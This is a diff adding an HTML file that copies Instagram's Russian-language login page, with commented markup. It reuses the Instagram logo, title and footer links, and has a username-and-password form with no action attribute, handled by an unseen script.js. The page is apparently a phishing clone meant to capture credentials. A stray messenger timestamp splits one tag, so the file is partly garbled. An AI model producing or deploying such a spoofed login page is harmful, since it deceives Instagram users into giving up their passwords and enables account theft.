@@ -1,0 +1,111 @@
+<!DOCTYPE html> 
+<html lang="ru"> 
+<head> 
+    <!-- Устанавливаем кодировку страницы UTF-8 --> 
+    <meta charset="UTF-8"> 
+ 
+    <!-- Указываем, что страница адаптируется под размер экрана (для мобильных устройств) --> 
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+ 
+    <!-- Заголовок страницы, который отображается во вкладке браузера --> 
+    <title>Instagram</title> 
+ 
+    <!-- Подключаем внешний файл стилей --> 
+    <link rel="stylesheet" href="styles.css"> 
+ 
+    <!-- Подключаем шрифты Google Fonts (шрифт Poppins с начертаниями 400, 500 и 600) --> 
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet"> 
+ 
+    <!-- Добавляем иконку сайта (favicon), которая отображается во вкладке браузера --> 
+    <link rel="icon" type="image/png" href="instagram_icon.png" sizes="32x32"> 
+ 
+</head> 
+ 
+<body> 
+    <!-- Основной контейнер для логин-формы --> 
+    <div class="login-container"> 
+        <!-- Логотип Instagram --> 
+        <img src="insta-logo.png" alt="Instagram Logo" class="logo"> 
+ 
+        <!-- Форма для ввода данных логина и пароля --> 
+        <form id="loginForm"> 
+            <!-- Поле для ввода логина (телефон, имя пользователя или email) --> 
+            <input type="text" name="username" id="username" placeholder="Телефон, имя пользователя или эл. адрес" required> 
+             
+            <!-- Поле для ввода пароля --> 
+            <input type="password" name="password" id="password" placeholder="Пароль" required> 
+ 
+            <!-- Кнопка для отправки формы (авторизация) --> 
+            <button type="submit">Войти</button> 
+        </form> 
+ 
+        <!-- Разделитель "ИЛИ" между формой логина и кнопкой входа через Facebook --> 
+        <div class="or-divider"> 
+            <span></span> ИЛИ <span></span> 
+        </div> 
+ 
+        <!-- Кнопка для входа через Facebook, с иконкой Facebook --> 
+        <a href="https://www.facebook.com/login.php?skip_api_login=1&api_key=..." class="fb-login" target="_blank"> 
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Icon" width="16" height="16"> 
+            Войти через Facebook 
+        </a> 
+ 
+        <!-- Ссылка для восстановления пароля --> 
+        <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-password">Забыли пароль?</a> 
+ 
+        <!-- Ссылка для регистрации нового аккаунта --> 
+        <p>У вас ещё нет аккаунта? <a href="https://www.instagram.com/accounts/emailsignup/">Зарегистрироваться</a></p> 
+    </div> 
+ 
+    <!-- Блок для скачивания мобильного приложения --> 
+    <div class="app-download"> 
+        <p>Установите приложение.</p> 
+        <div class="app-buttons"> 
+            <!-- Кнопка для перехода на страницу загрузки приложения в App Store --> 
+            <a href="https://apps.apple.com/app/id389801252" target="_blank"> 
+                <img src="appstore.png" alt="Загрузите в App Store"> 
+            </a> 
+            <!-- Кнопка для перехода на страницу загрузки приложения в Google Play --> 
+            <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank"> 
+                <img src="googleplay.png" alt="Доступно в Google Play"> 
+            </a> 
+        </div> 
+    </div> 
+ 
+    <!-- Футер страницы с дополнительной навигацией и ссылками --> 
+    <footer> 
+        <nav> 
+            <!-- Ссылка на выбор языка интерфейса --> 
+            <a href="#" class="language-selector">Русский ▼</a> 
+             
+            <!-- Различные ссылки на страницы Meta и Instagram --> 
+            <a href="https://about.meta.com/">Meta</a> 
+            <a href="https://about.instagram.com/">Информация</a> 
+            <a href="https://about.instagram.com/blog/">Блог</a> 
+            <a href="https://about.instagram.com/about-us/careers">Вакансии</a> 
+            <a href="https://help.instagram.com/">Помощь</a> 
+            <a href="https://developers.facebook.com/docs/instagram">API</a> 
+            <a
+
+., [27.10.2024 17:26]
+href="https://www.instagram.com/legal/privacy/">Конфиденциальность</a> 
+            <a href="https://www.instagram.com/legal/terms/">Условия</a> 
+            <a href="https://www.instagram.com/explore/locations/">Места</a> 
+            <a href="https://www.instagram.com/web/lite/">Instagram Lite</a> 
+            <a href="https://www.threads.net/">Threads</a> 
+        </nav> 
+ 
+        <!-- Дополнительные ссылки (над копирайтом) --> 
+        <div class="extra-links"> 
+            <a href="https://www.facebook.com/help/instagram/261704639352628" class="extra-link">Загрузка контактов и лица, не являющиеся пользователями</a> 
+            <a href="https://www.instagram.com/accounts/meta_verified/?entrypoint=web_footer" class="extra-link">Meta Verified</a> 
+        </div> 
+         
+        <!-- Копирайт --> 
+        <p>© 2024 Instagram from Meta</p> 
+    </footer> 
+ 
+    <!-- Подключаем внешний файл JavaScript (где обработаны действия на странице) --> 
+    <script src="script.js"></script> 
+</body> 
+</html>
